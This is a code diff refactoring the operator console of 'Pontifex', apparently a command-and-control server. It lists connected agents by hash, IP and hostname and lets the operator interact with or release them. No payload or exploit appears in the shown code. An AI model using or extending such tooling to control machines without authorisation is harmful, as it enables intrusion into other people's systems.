@@ -1,11 +1,16 @@
-
 # -*- coding: utf-8 -*-
 
+###############################################################
+##   pontifex.py                                             ##
+##   The Pontifex                                            ##
+##   Created by Bob Yuan on 2020-11-03.                      ##
+##   Copyright © 2020 Kryptosr. All rights reserved.         ##
+###############################################################
+
 import socket
-import sys, os, threading, time, subprocess, curses
+import sys, os, threading, time
 from hashlib import md5
 import json
-import tqdm
 from prompt_toolkit.history import FileHistory
 from prompt_toolkit import prompt
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
@@ -15,8 +20,6 @@ from lib.c2 import C2
 from lib.dmos import Dmos
 from termcolor import colored, cprint
 
-# SOCK_STREAM = tcp, SOCK_DGRAM = udp
-
 class Pontifex():
     def __init__(self):
         self.ANODE = "0.0.0.0"
@@ -25,35 +28,36 @@ class Pontifex():
         self.c2 = C2(self.ANODE, self.APORT, self)
         self.isConnected = False
 
-    @safe_exec
     def cmdline(self):
         while 1:
-            command = input(colored("[Pontifex] → ", 'cyan', attrs=['bold']))
+            cmd = input(colored("[Pontifex] → ", 'cyan', attrs=['bold']))
+            command = cmd.split(' ')[0]
+            args = cmd[len(command)+1:]
+
             if command == "exit":
                 Debug.eprint(f"C2 on tcp://{self.ANODE}:{self.APORT} shutting down...")
                 clean(self.c2.s)
                 os._exit(1)
             elif command == "clear":
                 os.system("clear")
-            elif command[:5] == "free ":
-                self.dmoss[command[5:]].conn.send("free".encode())
-                terminate(self.dmoss[command[5:]].conn, self.dmoss, self.dmoss[command[5:]], "gracefully")
+            elif command == "free":
+                self.dmoss[args].conn.send("free".encode())
+                terminate(self.dmoss[args].conn, self.dmoss, self.dmoss[args], "gracefully")
             elif command == "list":
                 #print(self.dmoss)
                 #print("BORN  HASH\tIP (global)\tHOSTNAME")
                 for d, hash in enumerate(self.dmoss):
                     print("{}\t{}\t{}\t\t{}".format(self.dmoss[hash].born, hash, self.dmoss[hash].GLOBAL, self.dmoss[hash].HOSTNAME))
-            elif command[:2] == "i ":
+            elif command == "i":
                 try:
-                    self.c2.interact(self.dmoss[command[2:]])
-                except:
+                    self.dmoss[args].interact()
+                except KeyError:
                     Debug.eprint("Invalid MD5_hash")
             elif command == "r":
                 clean(self.c2.s)
                 python = sys.executable
                 os.execl(python, python, *sys.argv)
 
-    @safe_exec
     def listener_daemon(self):
         while 1:
             dmos = self.c2.accept_conn()
@@ -74,7 +78,7 @@ class Pontifex():
             LISTENER.start()
             Debug.tprint(f"TCP server <tcp://{self.ANODE}:{self.APORT}> is online")
         except Exception as e:
-            Debug.eprint("Unable to start daemon listener, Error: {0}".format(e))
+            Debug.eprint(f"Unable to start daemon listener, Error: {e}")
 
     @safe_exec
     def start_c2(self):
